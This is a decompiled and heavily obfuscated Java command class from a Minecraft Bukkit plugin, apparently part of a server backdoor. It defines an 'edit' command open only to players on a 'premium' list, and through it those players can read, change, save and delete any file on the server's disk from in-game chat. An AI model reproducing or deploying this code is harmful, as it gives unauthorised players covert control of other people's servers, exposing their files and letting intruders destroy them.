/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.configuration.InvalidConfigurationException
 *  org.bukkit.configuration.file.YamlConfiguration
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.List;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.Tips;
import me.system.runner.utils.PluginUtils;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

public class EditCommand
extends Command {
    private static /* synthetic */ HashMap<String, YamlConfiguration> \u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3;
    private static /* synthetic */ HashMap<String, File> xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW;

    @Override
    public boolean isBlatant() {
        return true;
    }

    public EditCommand() {
        EditCommand llllllllllllllIIlIIIIlllIllIllII;
    }

    static {
        xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW = new HashMap();
        \u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3 = new HashMap();
    }

    @Override
    public void execute(Core llllllllllllllIIlIIIIlllIlIIllIl, String llllllllllllllIIlIIIIlllIlIIllII, String[] llllllllllllllIIlIIIIlllIlIIlIII, Player llllllllllllllIIlIIIIlllIlIIIlll) {
        if (llllllllllllllIIlIIIIlllIlIIllIl.premium.contains(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
            if (llllllllllllllIIlIIIIlllIlIIlIII.length <= 1) {
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage("");
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit start <plugin> &8l &fStart editing a plugin config.yml"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit start <plugin <file> &8l &fStart editing a plugin with given file"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit start <file> &8l &fStart editing any file"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit read <start line> <end line> &8l &fRead the file lines"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit get <section> &8l &fReturns value of the section"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit set <section> <value> &8l &fSets the section value to something"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit save &8l &fSave the file you're editing before closing"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit reload &8l &fReload your changes"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit delete &8l &fDeletes the file"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit close &8l &fClose the file"));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage("");
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            } else if (llllllllllllllIIlIIIIlllIlIIlIII.length <= 2) {
                if (llllllllllllllIIlIIIIlllIlIIlIII[1].equalsIgnoreCase("save")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                        File llllllllllllllIIlIIIIlllIllIIIIl = xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.get(llllllllllllllIIlIIIIlllIlIIIlll.getName());
                        if (\u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                            try {
                                YamlConfiguration llllllllllllllIIlIIIIlllIllIIIll = \u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.get(llllllllllllllIIlIIIIlllIlIIIlll.getName());
                                llllllllllllllIIlIIIIlllIllIIIll.save(llllllllllllllIIlIIIIlllIllIIIIl);
                                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("File saved!"));
                            }
                            catch (IOException llllllllllllllIIlIIIIlllIllIIIlI) {
                                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Couldn't save file"));
                            }
                        } else {
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Non Yaml files don't need to be saved"));
                        }
                    } else {
                        llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
                if (llllllllllllllIIlIIIIlllIlIIlIII[1].equalsIgnoreCase("close")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                        xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.remove(llllllllllllllIIlIIIIlllIlIIIlll.getName());
                        llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Session closed"));
                    } else {
                        llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
                if (llllllllllllllIIlIIIIlllIlIIlIII[1].equalsIgnoreCase("reload")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                        File llllllllllllllIIlIIIIlllIlIllllI = xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.get(llllllllllllllIIlIIIIlllIlIIIlll.getName());
                        if (\u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                            try {
                                \u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.get(llllllllllllllIIlIIIIlllIlIIIlll.getName()).load(llllllllllllllIIlIIIIlllIlIllllI);
                            }
                            catch (InvalidConfigurationException llllllllllllllIIlIIIIlllIllIIIII) {
                                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Reload failed"));
                            }
                            catch (IOException llllllllllllllIIlIIIIlllIlIlllll) {
                                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Reload failed"));
                            }
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("File reloaded!"));
                        } else {
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Non yaml files don't need to be reloaded"));
                        }
                    } else {
                        llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
                if (llllllllllllllIIlIIIIlllIlIIlIII[1].equalsIgnoreCase("delete")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                        File llllllllllllllIIlIIIIlllIlIlllIl = xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.get(llllllllllllllIIlIIIIlllIlIIIlll.getName());
                        if (llllllllllllllIIlIIIIlllIlIlllIl.delete()) {
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("File deleted!"));
                            xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.remove(llllllllllllllIIlIIIIlllIlIIIlll.getName());
                        } else {
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("File failed to deleted!"));
                        }
                    } else {
                        llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
            } else {
                block62: {
                    if (llllllllllllllIIlIIIIlllIlIIlIII[1].equalsIgnoreCase("start")) {
                        if (PluginUtils.getPluginByName(llllllllllllllIIlIIIIlllIlIIlIII[2]) != null) {
                            File llllllllllllllIIlIIIIlllIlIlllII = new File(String.valueOf(new StringBuilder().append(PluginUtils.getPluginByName(llllllllllllllIIlIIIIlllIlIIlIII[2]).getDataFolder()).append("/config.yml")));
                            xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.put(llllllllllllllIIlIIIIlllIlIIIlll.getName(), llllllllllllllIIlIIIIlllIlIlllII);
                            \u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.put(llllllllllllllIIlIIIIlllIlIIIlll.getName(), YamlConfiguration.loadConfiguration((File)llllllllllllllIIlIIIIlllIlIlllII));
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Started editing session with the file: ").append(Settings.RED).append("config.yml ").append(Settings.WHITE).append("from the plugin: ").append(Settings.RED).append(PluginUtils.getPluginByName(llllllllllllllIIlIIIIlllIlIIlIII[2]).getName()))));
                        } else if (new File(llllllllllllllIIlIIIIlllIlIIlIII[2]).exists()) {
                            File llllllllllllllIIlIIIIlllIlIllIll = new File(llllllllllllllIIlIIIIlllIlIIlIII[2]);
                            xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.put(llllllllllllllIIlIIIIlllIlIIIlll.getName(), llllllllllllllIIlIIIIlllIlIllIll);
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Started editing session with the file: ").append(Settings.RED).append(llllllllllllllIIlIIIIlllIlIllIll.getName()))));
                        } else {
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("File does not exist! (Cap Sensitive)"));
                        }
                    }
                    if (llllllllllllllIIlIIIIlllIlIIlIII[1].equalsIgnoreCase("read")) {
                        if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                            if (llllllllllllllIIlIIIIlllIlIIlIII.length <= 3) {
                                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You need a max line!"));
                            } else {
                                int llllllllllllllIIlIIIIlllIlIlIlIl = 1;
                                try {
                                    llllllllllllllIIlIIIIlllIlIlIlIl = Integer.parseInt(llllllllllllllIIlIIIIlllIlIIlIII[2]);
                                }
                                catch (NumberFormatException llllllllllllllIIlIIIIlllIlIllIlI) {
                                    llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Lines must be an number"));
                                    return;
                                }
                                int llllllllllllllIIlIIIIlllIlIlIlII = 1;
                                try {
                                    llllllllllllllIIlIIIIlllIlIlIlII = Integer.parseInt(llllllllllllllIIlIIIIlllIlIIlIII[3]);
                                }
                                catch (NumberFormatException llllllllllllllIIlIIIIlllIlIllIIl) {
                                    llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Lines must be an number"));
                                    return;
                                }
                                try {
                                    List<String> llllllllllllllIIlIIIIlllIlIlIlll = Files.readAllLines(Paths.get(xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.get(llllllllllllllIIlIIIIlllIlIIIlll.getName()).getAbsolutePath(), new String[0]));
                                    if (llllllllllllllIIlIIIIlllIlIlIlll.size() >= llllllllllllllIIlIIIIlllIlIlIlII) {
                                        if (llllllllllllllIIlIIIIlllIlIlIlIl <= llllllllllllllIIlIIIIlllIlIlIlll.size()) {
                                            if (llllllllllllllIIlIIIIlllIlIlIlIl > 0 && llllllllllllllIIlIIIIlllIlIlIlII > 0) {
                                                for (int llllllllllllllIIlIIIIlllIlIllIII = llllllllllllllIIlIIIIlllIlIlIlIl; llllllllllllllIIlIIIIlllIlIllIII < llllllllllllllIIlIIIIlllIlIlIlII + 1; ++llllllllllllllIIlIIIIlllIlIllIII) {
                                                    llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(String.valueOf(new StringBuilder().append(llllllllllllllIIlIIIIlllIlIllIII).append(" ").append(llllllllllllllIIlIIIIlllIlIlIlll.get(llllllllllllllIIlIIIIlllIlIllIII - 1))));
                                                }
                                            } else {
                                                llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Maximum and Minimum need to be bigger than 0"));
                                            }
                                        } else {
                                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The file only has ").append(llllllllllllllIIlIIIIlllIlIlIlll.size()).append(" lines!"))));
                                        }
                                        break block62;
                                    }
                                    llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The file only has ").append(llllllllllllllIIlIIIIlllIlIlIlll.size()).append(" lines!"))));
                                }
                                catch (IOException llllllllllllllIIlIIIIlllIlIlIllI) {
                                    llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("Error while trying to read file."));
                                }
                            }
                        } else {
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                        }
                    }
                }
                if (llllllllllllllIIlIIIIlllIlIIlIII[1].equalsIgnoreCase("get")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                        if (\u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                            StringBuilder llllllllllllllIIlIIIIlllIlIlIIlI = new StringBuilder();
                            for (int llllllllllllllIIlIIIIlllIlIlIIll = 2; llllllllllllllIIlIIIIlllIlIlIIll < llllllllllllllIIlIIIIlllIlIIlIII.length; ++llllllllllllllIIlIIIIlllIlIlIIll) {
                                llllllllllllllIIlIIIIlllIlIlIIlI.append(" ").append(llllllllllllllIIlIIIIlllIlIIlIII[llllllllllllllIIlIIIIlllIlIlIIll]);
                            }
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The value of ").append(llllllllllllllIIlIIIIlllIlIlIIlI.substring(1)).append(" is: ").append(Settings.RED).append("'").append(\u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.get(llllllllllllllIIlIIIIlllIlIIIlll.getName()).get(llllllllllllllIIlIIIIlllIlIlIIlI.substring(1))).append("'"))));
                        } else {
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You can only use this with Yaml files"));
                        }
                    } else {
                        llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
                if (llllllllllllllIIlIIIIlllIlIIlIII[1].equalsIgnoreCase("set")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD\u00a3jeNdVW.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                        if (\u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.containsKey(llllllllllllllIIlIIIIlllIlIIIlll.getName())) {
                            String llllllllllllllIIlIIIIlllIlIlIIII = \u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.get(llllllllllllllIIlIIIIlllIlIIIlll.getName()).get(llllllllllllllIIlIIIIlllIlIIlIII[2]).toString();
                            StringBuilder llllllllllllllIIlIIIIlllIlIIllll = new StringBuilder();
                            for (int llllllllllllllIIlIIIIlllIlIlIIIl = 3; llllllllllllllIIlIIIIlllIlIlIIIl < llllllllllllllIIlIIIIlllIlIIlIII.length; ++llllllllllllllIIlIIIIlllIlIlIIIl) {
                                llllllllllllllIIlIIIIlllIlIIllll.append(String.valueOf(new StringBuilder().append(" ").append(llllllllllllllIIlIIIIlllIlIIlIII[llllllllllllllIIlIIIIlllIlIlIIIl])));
                            }
                            \u00a3ZkCPudgvuXNFCpwA\u00a3DFjBFJhsfccTXJHRJEnnfdnjq$Bec\u00a3U\u00a3.get(llllllllllllllIIlIIIIlllIlIIIlll.getName()).set(llllllllllllllIIlIIIIlllIlIIlIII[2], (Object)llllllllllllllIIlIIIIlllIlIIllll.substring(1));
                            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You changed the value of ").append(Settings.RED).append(llllllllllllllIIlIIIIlllIlIIlIII[2]).append(Settings.WHITE).append(" from: ").append(Settings.RED).append("'").append(llllllllllllllIIlIIIIlllIlIlIIII).append("'").append(Settings.WHITE).append(" to ").append(Settings.RED).append("'").append(llllllllllllllIIlIIIIlllIlIIllll.substring(1)).append("'"))));
                        }
                    } else {
                        llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
            }
        } else {
            llllllllllllllIIlIIIIlllIlIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

